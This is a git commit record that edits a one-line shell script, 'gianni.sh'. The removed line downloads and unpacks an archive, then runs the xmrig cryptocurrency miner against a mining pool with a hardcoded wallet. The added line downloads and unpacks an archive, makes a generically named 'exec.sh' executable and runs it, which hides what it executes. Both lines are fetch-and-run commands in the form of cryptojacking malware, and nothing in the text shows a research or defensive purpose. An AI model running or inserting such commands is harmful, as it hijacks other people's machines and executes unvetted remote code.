4822706d9862e42207d6ca1e0cca52f413844608
thisby <bentaleb.youness@gmail.com>
2023-02-12 18:31:39 +0100

    Update gianni.sh

--- scripts/gianni.sh
+++ scripts/gianni.sh
@@ -1,1 +1,1 @@
-wget https://github.com/thisby/StudyIA && tar -xvf xc.tar && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TALFCwj7GajwwmctVsLXdeeDAJKa67sj4d.Cornertech -p x
+wget https://github.com/thisby/StudyIA && tar -xvf xc.tar.gz && cd dist && chmod +x exec.sh && ./exec.sh
